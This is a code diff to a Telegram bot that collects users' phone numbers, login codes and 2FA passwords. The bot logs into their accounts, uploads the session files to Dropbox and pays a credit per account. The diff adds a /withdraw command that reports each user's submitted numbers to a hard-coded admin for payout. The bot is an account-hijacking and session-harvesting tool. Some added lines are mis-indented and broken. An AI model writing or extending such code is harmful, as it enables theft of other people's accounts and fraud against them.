@@ -73,12 +73,20 @@ async def save_credits(credits: dict):
         mode=dropbox.files.WriteMode("overwrite")
     )
     
-async def add_credit(user_id, amount):
+async def add_credit(user_id, amount, number_sent=None):
     credits = await load_credits()
     key = str(user_id)
-    credits[key] = credits.get(key, 0) + amount
+    if key not in credits:
+        credits[key] = {"credits": 0, "numbers": []}
+    
+    credits[key]["credits"] += amount
+    
+    if number_sent:
+        credits[key]["numbers"].append(number_sent)
+    
     await save_credits(credits)
-    return credits[key]
+    return credits[key]["credits"]
+
     
 # ---- Get Credit for User ----
 
@@ -90,6 +98,38 @@ async def get_user_credits(user_id):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
     return ASK_PHONE
+
+# ---- Command to withdraw credits ----
+async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = str(user.id)
+    credits = await load_credits()
+
+    if user_id not in credits or credits[user_id]["credits"] == 0:
+        await update.message.reply_text("❌ You have no credits to withdraw.")
+        return
+
+    user_credits = credits[user_id]["credits"]
+    submitted_numbers = credits[user_id]["numbers"]
+
+    # Send notification to admin
+    admin_id = 1155949927  # <-- Replace with your own Telegram user ID
+    notification_message = (
+        f"📢 *Withdraw Request Received!*\n\n"
+        f"👤 User: {user.full_name} (@{user.username})\n"
+        f"🆔 User ID: {user_id}\n"
+        f"💰 Credits Requested: {user_credits}\n"
+        f"📱 Numbers Submitted:\n" +
+        "\n".join(submitted_numbers)
+    )
+    
+    await context.bot.send_message(chat_id=admin_id, text=notification_message, parse_mode="Markdown")
+    await update.message.reply_text("✅ Your withdrawal request has been sent to the admin.")
+
+    # Reset user's credits after withdrawal
+    credits[user_id]["credits"] = 0
+    credits[user_id]["numbers"] = []
+    await save_credits(credits)
 
 # ---- Handle Phone Number ----
 async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -136,7 +176,8 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("✅ Logged in successfully!")
 
         # Add 1 credit after successful login
-        new_credit_balance = await add_credit(user_id, 1)  # Adding 1 credit as an example
+        new_credit_balance = await add_credit(user_id, 1, phone)
+  # Adding 1 credit as an example
 
         # Upload session file to Dropbox
         await upload_session_to_dropbox(client, phone)
@@ -190,7 +231,8 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("✅ Logged in successfully with 2FA!")
 
         # Add 1 credit after successful login
-        new_credit_balance = await add_credit(user_id, 1)
+        new_credit_balance = await add_credit(user_id, 1, session["phone"])
+
 
         # Upload session file to Dropbox
         await upload_session_to_dropbox(client, session["phone"])
@@ -254,6 +296,7 @@ def main():
 
     # Add the /credits command handler to check credits
     app.add_handler(CommandHandler("credits", check_credits))
+app.add_handler(CommandHandler("withdraw", withdraw))
 
     app.add_handler(conv_handler)
 
